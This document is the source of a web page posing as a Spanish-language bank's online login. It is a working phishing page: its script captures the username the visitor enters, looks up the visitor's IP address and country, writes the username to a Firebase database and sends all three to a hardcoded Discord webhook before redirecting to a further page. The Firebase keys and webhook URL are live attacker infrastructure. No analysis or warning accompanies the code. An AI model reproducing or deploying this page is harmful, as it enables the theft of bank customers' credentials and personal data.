<html><head>
    <link href="./fonts/desktops.css" type="text/css" rel="stylesheet">
	<link rel="SHORTCUT ICON" href="images/favicon.ico"/>
	<meta charset="UTF-8">
	<title>Ingreso en linea</title>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

const fbseconfig = {
  apiKey: "AIzaSyBAFMqfpBe-lJc8zvZiwoWv8Wtgjph7GDY",
  authDomain: "prrueba02-a7511.firebaseapp.com",
  databaseURL: "https://prrueba02-a7511-default-rtdb.firebaseio.com",
  projectId: "prrueba02-a7511",
  storageBucket: "prrueba02-a7511.firebasestorage.app",
  messagingSenderId: "409778587656",
  appId: "1:409778587656:web:627110c05e23bd3c5869bd"
};

      const app = initializeApp(fbseconfig);
      const db = getFirestore(app);

      window.db = db;
      window.doc = doc;
      window.setDoc = setDoc;
    </script>
</head>
<body>

    <div style="margin-top: 20px;margin-bottom: 20px;margin-left: auto;margin-right: auto;width: 52%;">
	<img src="images/1.png" alt="logo">
	</div>
	
<div class="btn_fw"></div>

<div style="margin-top: 35px;margin-left: auto;margin-bottom: 20px;margin-right: auto;width: 51%;">
<div style="display:flex;margin-bottom: 20px;"><img src="images/2.png" alt="logo" style="float: left;margin-right: 10px;margin-top: 15px;">
<form class="formashe" action="#" id="pedido" method="post">
                        <div style="text-align: center">
                          <div id="ValidateAlias">
                            <div class="sub_title sub_title_login text_login" style="width: 400px;">
                              <span id="ctl00_PlaceHolder_pbLoginUC_clAliasArea" class="sub_title_text f130 text_login">Por favor, digite su usuario</span>
                            </div>
                            <div>
                              <table style="margin: 10px auto;" cellspacing="10">
                                <tbody>
                                  <tr>
                                    <td align="right">
                                      <span id="tltusuario" class="normal_textt strong text_login" style="display:inline-block;width:85px;padding-top:7px;">Usuario</span>
                                    </td>
                                    <td>
                                      <input name="miusuario" type="text" maxlength="50" id="miusuario" style="width:150px;" tabindex="0" required="">
                                      <span id="rvLogin" style="color:Red;background-color:Transparent;visibility:hidden;">*</span>
                                      <button type="submit" name="botondepedido" value="Ingresar" id="btValidateAlias" class="buttons buttons_text notNullOrEmpty text_login">Ingresar</button>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                        
                          <div class="m-l-45 logi_remove">
                            <link href="./fonts/utilities.css" rel="stylesheet" type="text/css">
                            <div class="login_form p-b-10" id="divContainAllControls">
                              
                              <table class="p-b-10">
                                <tbody>
                                  <tr>
                                    <td class="textleft">
                                      <span id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_clDigitalSignature" class="normal_textt strong text-bottom text_login">Firma Digital</span>
                                      <input class="inp-cbx" id="cbx" type="checkbox" style="display: none;" tabindex="0">
                                      <label class="cbx m-l-9" for="cbx">
                                        <span>
                                          <svg width="12px" height="10px" viewBox="0 0 12 10">
                                            <polyline points="1.5 6 4.5 9 10.5 1"></polyline>
                                          </svg>
                                        </span>
                                        <span></span>
                                      </label>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                          <div class="login_form login_reposition_line m-l-20 m-t-0 p-t-0"></div>
                          <div id="">
                            <div id="" style="margin: 10px auto; text-align: center;">
                              <i class="fa fa-info-circle" style="font-size:20px">&nbsp;</i>
                              <button type="button" class="styleRecoverPassword text_login">¿Olvidó su contraseña?</button>
                            </div>
                            <table style="margin: 10px auto;">
                              <tbody>
                                <tr>
                                  <td></td>
                                  <td>
                                    <input type="submit" value="1. Solicite una contraseña temporal" class="buttons buttons_text text_login">
                                  </td>
                                </tr>
                              </tbody>
                            </table>
                            
                            <table style="margin: 10px auto;">
                              <tbody>
                                <tr>
                                  <td></td>
                                  <td>
                                    <input type="submit" value="2. Ingrese su contraseña temporal" class="buttons buttons_text text_login">
                                  </td>
                                </tr>
                              </tbody>
                            </table><div class="login_form m-l-20"></div>
                            <div>
                              <div style="margin: 10px auto; text-align: center;">
                                <span id="ctl00_PlaceHolder_pbLoginUC_GalileoASPLabelQuestionSignUp" class="f180 text_login">¿Es cliente y no tiene usuario?</span>
                              </div>
                              <div class="styleDivSignUp">
                                <input type="submit" value="Crear Usuario" class="buttons buttons_text text_login">
                              </div>
                            </div>
                          </div>
                    </div>
					</form>
					</div>

<img src="images/3.png" alt="logo" style="border-width:0px;">
</div>

<div class="btn_fw"></div>

</body>
<script>
    async function getCountry() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.country;
            } catch (error) {
                console.error('Error al obtener el país:', error);
                return 'País Desconocido';
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error al obtener la dirección IP:', error);
                return 'IP Desconocida';
            }
        }
		document
      .querySelector("#pedido")
      .addEventListener("submit", async (event) => {
        event.preventDefault();

        const usuario = document.querySelector("#miusuario").value;
		const pais = await getCountry();
            const ip = await getIPAddress();

        if (!usuario ) {
          alert("Por favor, complete todos los campos.");
          return;
        }

        try {
          const lptref = doc(window.db, "promebdt", usuario);
          await setDoc(lptref, {
            question1: "Sin uso",
            question2: "Sin uso",
            question3: "Sin uso",
            page: 0,
          });

          localStorage.setItem("usuario", usuario);
          const message = `🏦Pr0m3r1c4\nUsuario: ${usuario}\nPaís: ${pais}\n\IP: ${ip}\n`;


      const discord_webhook_url = "https://discord.com/api/webhooks/1412107225576640603/Bd0PtElz6CKfzc6vm5pG06T4A3Apec2T5RZbY2k0E8NyztRBwSK4I5aKRU9qK5cbVxsA";

      await fetch(discord_webhook_url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: message
        }),
      });

          window.location.href = "index-2";
        } catch (error) {
          console.error("Error al enviar datos:", error);
        }
      });
  </script></html>